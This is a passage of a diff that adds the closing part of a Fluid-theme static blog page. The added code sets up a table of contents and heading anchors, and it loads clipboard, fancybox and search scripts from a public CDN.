+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
